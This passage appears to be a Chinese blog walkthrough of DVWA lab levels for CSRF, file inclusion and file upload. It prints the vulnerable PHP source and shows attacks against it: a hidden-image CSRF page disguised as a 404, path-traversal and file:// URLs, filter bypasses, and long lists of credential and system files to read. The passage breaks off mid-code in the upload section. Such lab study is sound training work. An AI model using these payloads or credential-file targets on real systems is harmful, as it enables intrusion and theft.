title="low"></a>low</h2><p>我们首先要了解CSRF具体指的是什么，我们可以理解为当用户A登录了网站B，攻击者C知道网站B的一项功能的请求url，那么攻击者A构造这一url，发送给用户A，用户A点击该链接，产生的行为就是在用户A未知的情况下，伪造A的身份进行的操作，可以是改密码，转账等敏感行为。</p><p>在实践中，我们使用的url为：<code>http://172.16.34.167/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change</code></p><p>直接访问这个链接的话，很明显这个链接的目的是更改密码，因此我们可以用短链接的形式来隐藏真实的url。但是访问后，仍会显示更改密码成功后的页面，因此，我们可以构造一个exp页面来实现攻击。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>404<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://172.16.34.167/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br><span class="line">      file not found.</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( eregi( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ], <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ) ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            <span class="variable">$pass_new</span> = mysql_real_escape_string( <span class="variable">$pass_new</span> );</span><br><span class="line">            <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = mysql_query( <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn&#x27;t come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里用<code>eregi()</code>比较<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>和<code>$_SERVER[&#39;HTTP_REFERER&#39;]</code>是否相同，也就是判断<code>request</code>头中的<code>referer</code>中是否有<code>host</code>。若不同的话，不会进行之后的操作。</p><p>因此我们需要使来源网站包含目标ip，即<code>172.16.34.167</code>，所以我们将exp网页的名字改为<code>172.16.34.167.html</code>即可。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200216160324.png"></p><h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = mysql_real_escape_string( <span class="variable">$pass_new</span> );</span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysql_query( <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以看到这里是添加了一个<code>Anti-CSRF token</code>，每次访问都会产生一个随机值，我们在更改密码时都需要提交这个随机值和服务器上的进行匹配。</p><p>之前找到的ifram获取token的方法，尝试之后发现因为同源策略的问题，没有办法获取到，因此需结合其他方法获得。</p><h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><h2 id="low-5"><a href="#low-5" class="headerlink" title="low"></a>low</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们首先点击file1.php，观察包含文件在url中。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200214145932.png"></p><p>因此我们可以构造url中的参数，找服务器中的敏感文件。</p><p>我们首先输入一个<code>http://172.16.34.167/dvwa/vulnerabilities/fi/?page=/etc/passwd</code></p><p>可以看到报错信息，发现网站存放的绝对路劲。</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200220110503.png"><p>以下贴出查到的一些敏感文件。</p><p>Windows:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">c:/boot.ini <span class="comment">#查看系统版本 </span></span><br><span class="line">c:/windows/php.ini <span class="comment">#php配置信息 </span></span><br><span class="line">c:/windows/my.ini <span class="comment">#MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码 </span></span><br><span class="line">c:/winnt/php.ini </span><br><span class="line">c:/winnt/my.ini </span><br><span class="line">c:\mysql\data\mysql\user.MYD <span class="comment">#mysql.user表中的数据库连接密码 </span></span><br><span class="line">c:\Program Files\RhinoSoft.com\Serv<span class="literal">-U</span>\ServUDaemon.ini <span class="comment">#存储了虚拟主机网站路径和密码 </span></span><br><span class="line">c:\Program Files\Serv<span class="literal">-U</span>\ServUDaemon.ini </span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml <span class="comment">#查看IIS的虚拟主机配置 </span></span><br><span class="line">c:\windows\repair\sam <span class="comment">#WINDOWS系统初次安装的密码 </span></span><br><span class="line">c:\Program Files\ Serv<span class="literal">-U</span>\ServUAdmin.exe <span class="comment">#6.0版本以前的serv-u管理员密码 </span></span><br><span class="line">c:\Program Files\RhinoSoft.com\ServUDaemon.exe </span><br><span class="line">C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件  <span class="comment">#存储了pcAnywhere的登陆密码 </span></span><br><span class="line">c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf <span class="comment">#查看WINDOWS系统apache文件 </span></span><br><span class="line">c:/Resin<span class="literal">-3</span>.<span class="number">0.14</span>/conf/resin.conf <span class="comment">#查看jsp开发的网站resin文件配置信息. </span></span><br><span class="line">c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf <span class="comment">#查看linux系统配置的JSP虚拟主机 </span></span><br><span class="line">d:\APACHE\Apache2\conf\httpd.conf </span><br><span class="line">C:\Program Files\mysql\my.ini </span><br><span class="line">C:\mysql\data\mysql\user.MYD <span class="comment">#存在MYSQL系统中的用户密码 </span></span><br><span class="line">C:\Windows\System32\drivers\etc\hosts</span><br><span class="line">winserver配置</span><br><span class="line">Telnet信息</span><br></pre></td></tr></table></figure><p>Linux/Unix:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/app/apache2/conf/httpd.conf #apache2缺省配置文件  </span><br><span class="line">/usr/local/apache2/conf/httpd.conf  </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf #虚拟网站设置  </span><br><span class="line">/usr/local/app/php5/lib/php.ini #PHP相关设置 </span><br><span class="line">/etc/sysconfig/iptables #从中得到防火墙规则策略  </span><br><span class="line">/etc/httpd/conf/httpd.conf #apache配置文件  </span><br><span class="line">/etc/rsyncd.conf #同步程序配置文件  </span><br><span class="line">/etc/my.cnf #mysql的配置文件  </span><br><span class="line">/etc/redhat-release #系统版本  </span><br><span class="line">/etc/issue  </span><br><span class="line">/etc/issue.net</span><br><span class="line"></span><br><span class="line">etc/passwd #存储操作系统用户信息,该文件为所有用户可见</span><br><span class="line">用户名: 密码 : uid  : gid :用户描述：主目录：登陆shell</span><br><span class="line">密码：x表示暗文,相反为明文</span><br><span class="line"></span><br><span class="line">uid：userid,”0”为root ID.1-99为系统保留,分配给系统预定义帐号。Linux用户可以分为3类：超级用户（root）、管理用户和普通用户</span><br><span class="line"> </span><br><span class="line">　　伪用户（psuedo users）</span><br><span class="line">　　　　bin #拥有可执行的用户命令文件</span><br><span class="line">　　　　sys #拥有系统文件</span><br><span class="line">　　　　adm #拥有账户文件</span><br><span class="line">　　　　uucp #UUCP使用</span><br><span class="line">　　　　Ip #Ip或lpd子系统使用</span><br><span class="line">　　　　nobody #NFS使用</span><br><span class="line">　　　　audit</span><br><span class="line">　　　　cron</span><br><span class="line">　　　　mail</span><br><span class="line">　　　　usenet</span><br><span class="line"></span><br><span class="line">gid:字段记录的是用户所属的用户组。对应着/etc/group文件中的一条记录</span><br><span class="line">　用户描述：字段记录着用户的一些个人情况，例如用户的真实姓名、电话、地址等</span><br><span class="line">　　</span><br><span class="line">  主目录：用户的起始工作目录</span><br><span class="line">　</span><br><span class="line">  登陆shell：</span><br><span class="line">　　　　　　常用shell - sh(BourneShell),csh(CShell),ksh(KornShell),tcsh(TENEX/TOPS-20typeCShell),bash(BourneAgainShell)</span><br><span class="line">　　　　　　/bin/sh #默认登录Shell   /sbin/nologin #代表用户不能登录</span><br><span class="line"> </span><br><span class="line">/etc/shadow</span><br><span class="line">username: passwd: lastchg: min: max: warn: inactive: expire: flag</span><br><span class="line">登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志</span><br><span class="line"></span><br><span class="line">口令 - 加密后的用户口令字，13个字符；如果为空/用户没有口令；如含有不属于集合&#123;./0-9A-Za-z&#125;中的字符/用户不能登录</span><br><span class="line">最后一次修改时间 - 表示的是从某个时刻起，到用户最后一次修改口令时的天数。时间起点对不同的系统可能不同</span><br><span class="line">最小时间间隔 - 两次修改口令之间所需的最小天数</span><br><span class="line">最大时间间隔 - 口令保持有效的最大天数</span><br><span class="line">警告时间  - 从系统开始警告用户到用户密码正式失效之间的天数</span><br><span class="line">不活动时间 - 用户没有登录活动但账号仍能保持有效的最大天数</span><br><span class="line">失效时间 - 账号的生存期。</span><br><span class="line">保留条目 - 无用字段</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/etc/group 存储有关本地用户组的信息</span><br><span class="line">一个组中可以有多个用户，一个用户也可以属于不同的组。当一个用户同时是多个组中的成员时，在/etc/passwd文件中记录的是登录时所属的默认组</span><br><span class="line">用户要访问属于附加组的文件时，必须首先使用newgrp命令使自己成为所要访问的组中的成员</span><br><span class="line">1）groupname GID #组名</span><br><span class="line">2）password #密码位置</span><br><span class="line">3）GID #组ID</span><br><span class="line">4）user #组成员</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">/usr/local/app/php5/lib/php.ini #PHP相关设置 </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf #虚拟网站设置 </span><br><span class="line">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf #linux APACHE虚拟主机配置文件 </span><br><span class="line">/usr/local/resin-3.0.22/conf/resin.conf #3.0.22的RESIN配置文件 </span><br><span class="line">/usr/local/resin-pro-3.0.22/conf/resin.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #APASHE虚拟主机</span><br><span class="line">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf #linux APACHE虚拟主机配置文件 </span><br><span class="line">/usr/local/resin-3.0.22/conf/resin.conf #3.0.22的RESIN配置文件</span><br><span class="line">/usr/local/resin-pro-3.0.22/conf/resin.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #APASHE虚拟主机 </span><br><span class="line">/etc/sysconfig/iptables #查看防火墙策略 </span><br><span class="line">/root/.mysql_history、/root/.bash_history      #Mysql账号密码信息</span><br></pre></td></tr></table></figure><p>我们在这里还可以利用路径回溯：<code>../../../../</code>来寻找敏感文件。</p><blockquote><p>在php的环境下，我们还可以读取php.ini，来查看php的配置。</p><p>php版本小于5.3.4，并且Magic_quote_gpc为off时，可以使用%00截断。</p><p>当配置中，allow_url_fopen与allow_url_include开启时，还可以包含远程服务器的文件，若对文件还没有检查，可导致远程代码执行。</p></blockquote><h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，对传入参数进行了过滤，将<code>http://</code>、<code>https://</code>、<code>../</code>、<code>..\</code>都进行了过滤，替换为空。</p><p>我们可以使用双写的方法进行绕过。如：</p><p><code>htthttps://ps://</code></p><p><code>..././</code></p><h2 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">&quot;file*&quot;</span>, <span class="variable">$file</span> ) &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现通过<code>fnmatch()</code>只能包含file开头的文件，那么我们可以通过file协议来进行绕过。</p><blockquote><p><a href="http://172.16.34.167/dvwa/vulnerabilities/fi/page=file:///C:/flag/flag.txt">http://172.16.34.167/dvwa/vulnerabilities/fi/page=file:///C:/flag/flag.txt</a></p></blockquote><p>然后是任意代码执行，需要结合文件上传，然后找到上传文件的绝对路径，将文件用file协议包含进来。</p><h2 id="Impossible-3"><a href="#Impossible-3" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file1.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file2.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file3.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用了白名单的手段，只允许<code>include.php</code>、<code>file1.php</code>、<code>file2php</code>、<code>file3.php</code>。</p><h1 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h1><h2 id="low-6"><a href="#low-6" class="headerlink" title="low"></a>low</h2><p>low等级的没有任何的过滤和防护，所以首先尝试上传一句话，发现没法上传，可能和php的版本问题有关，我们之后又上传探针，成功。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200214152109.png"></p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200214152129.png" style="zoom:50%;"><h2 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span 